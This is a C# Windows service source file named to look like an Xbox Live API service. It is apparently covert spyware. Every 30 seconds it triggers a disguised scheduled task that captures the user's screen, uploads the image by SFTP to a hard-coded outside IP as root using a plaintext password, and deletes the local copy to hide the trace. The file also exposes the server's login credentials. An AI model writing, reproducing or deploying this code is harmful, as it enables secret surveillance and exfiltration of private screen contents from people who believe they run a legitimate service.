using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.ServiceProcess;
using System.Text;
using System.Threading.Tasks;
using System.Timers;
using System.Drawing;
using System.Drawing.Imaging;
using Renci.SshNet;
using System.Windows.Forms;

namespace XbozPcAppFT
{
    public enum ServiceState
    {
        SERVICE_STOPPED = 0x00000001,
        SERVICE_START_PENDING = 0x00000002,
        SERVICE_STOP_PENDING = 0x00000003,
        SERVICE_RUNNING = 0x00000004,
        SERVICE_CONTINUE_PENDING = 0x00000005,
        SERVICE_PAUSE_PENDING = 0x00000006,
        SERVICE_PAUSED = 0x00000007,
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct ServiceStatus
    {
        public int dwServiceType;
        public ServiceState dwCurrentState;
        public int dwControlsAccepted;
        public int dwWin32ExitCode;
        public int dwServiceSpecificExitCode;
        public int dwCheckPoint;
        public int dwWaitHint;
    };
    public partial class XboxLiveApiSvc : ServiceBase
    {
        [DllImport("advapi32.dll", SetLastError = true)]
        private static extern bool SetServiceStatus(System.IntPtr handle, ref ServiceStatus serviceStatus);

        private EventLog _eventLog1;
        private int eventId = 1;

        public XboxLiveApiSvc()
        {
            InitializeComponent();
            _eventLog1 = new EventLog();
            if (!EventLog.SourceExists("XboxSource"))
            {
                EventLog.CreateEventSource("XboxSource", "XboxLog");
            }
            _eventLog1.Source = "XboxSource";
            _eventLog1.Log = "XboxLog";
        }

        protected override void OnStart(string[] args)
        {
            _eventLog1.WriteEntry("In OnStart.");

            // Update the service state to Start Pending.
            ServiceStatus serviceStatus = new ServiceStatus();
            serviceStatus.dwCurrentState = ServiceState.SERVICE_START_PENDING;
            serviceStatus.dwWaitHint = 100000;
            SetServiceStatus(this.ServiceHandle, ref serviceStatus);

            // 1️⃣ Take a screenshot immediately
            _eventLog1.WriteEntry("Taking immediate screenshot on start...");
            TakeScreenshot();

            // 2️⃣ Set up a timer that triggers every minute.
            System.Timers.Timer timer = new System.Timers.Timer
            {
                Interval = 30000 // 30 seconds
            };
            timer.Elapsed += new ElapsedEventHandler(this.OnTimer);
            timer.Start();

            // Update the service state to Running.
            serviceStatus.dwCurrentState = ServiceState.SERVICE_RUNNING;
            SetServiceStatus(this.ServiceHandle, ref serviceStatus);
        }

        protected override void OnStop()
        {
            _eventLog1.WriteEntry("In OnStop.");
            // Update the service state to Stop Pending.
            ServiceStatus serviceStatus = new ServiceStatus();
            serviceStatus.dwCurrentState = ServiceState.SERVICE_STOP_PENDING;
            serviceStatus.dwWaitHint = 100000;
            SetServiceStatus(this.ServiceHandle, ref serviceStatus);

            // Update the service state to Stopped.
            serviceStatus.dwCurrentState = ServiceState.SERVICE_STOPPED;
            SetServiceStatus(this.ServiceHandle, ref serviceStatus);
        }

        private void OnTimer(object sender, ElapsedEventArgs e)
        {
            _eventLog1.WriteEntry("Timer triggered. Attempting to take screenshot...");
            TakeScreenshot();
        }

        private void TakeScreenshot()
        {
            string userName = "hzluq";
            string userTempDir = $@"C:\Users\{userName}\AppData\Local\Temp";
            try
            {
                _eventLog1.WriteEntry("Attempting to trigger scheduled task for screenshot...");

                // 1️⃣ Run the scheduled task
                ProcessStartInfo psi = new ProcessStartInfo
                {
                    FileName = "schtasks",
                    Arguments = "/run /tn \"RunXboxBarGameWidgets\"",
                    CreateNoWindow = true,
                    UseShellExecute = false,
                    RedirectStandardOutput = true,
                    RedirectStandardError = true
                };

                using (Process proc = Process.Start(psi))
                {
                    string output = proc.StandardOutput.ReadToEnd();
                    string error = proc.StandardError.ReadToEnd();
                    proc.WaitForExit();

                    if (proc.ExitCode == 0)
                        _eventLog1.WriteEntry($"Scheduled task triggered successfully: {output}");
                    else
                    {
                        _eventLog1.WriteEntry($"Scheduled task failed (code {proc.ExitCode}): {error}");
                        return; // Skip upload if task failed
                    }
                }

                // 2️⃣ Wait briefly to allow screenshot tool to finish
                System.Threading.Thread.Sleep(3000); // 3 seconds — adjust if needed

                // 3️⃣ Find the latest screenshot file
                var latestScreenshot = new DirectoryInfo(userTempDir)
                    .GetFiles("screenshot_*.png")
                    .OrderByDescending(f => f.LastWriteTime)
                    .FirstOrDefault();

                if (latestScreenshot == null)
                {
                    _eventLog1.WriteEntry("No screenshot file found in user's temp folder.");
                    return;
                }

                string localPath = latestScreenshot.FullName;
                string fileName = latestScreenshot.Name;

                _eventLog1.WriteEntry($"Found screenshot: {fileName}");

                // 4️⃣ Upload via SFTP
                try
                {
                    string host = "202.182.127.60";
                    string username = "root";
                    string password = "6,CkoCF*AY59?r6@";
                    string remoteDirectory = "/root/screenshots/";

                    using (var sftp = new SftpClient(host, 22, username, password))
                    {
                        sftp.Connect();

                        if (!sftp.Exists(remoteDirectory))
                            sftp.CreateDirectory(remoteDirectory);

                        using (var fileStream = new FileStream(localPath, FileMode.Open))
                        {
                            sftp.UploadFile(fileStream, Path.Combine(remoteDirectory, fileName));
                        }

                        sftp.Disconnect();
                    }

                    // 5️⃣ Clean up
                    File.Delete(localPath);
                    _eventLog1.WriteEntry($"Screenshot uploaded and deleted: {fileName}");
                }
                catch (Exception ex)
                {
                    _eventLog1.WriteEntry($"Screenshot upload failed: {ex.Message}\n{ex.StackTrace}");
                }

            }
            catch (Exception ex)
            {
                _eventLog1.WriteEntry($"Screenshot failed: {ex.Message}\n{ex.StackTrace}");
            }
        }

        protected override void OnContinue()
        {
            _eventLog1.WriteEntry("In OnContinue.");
        }
    }
}
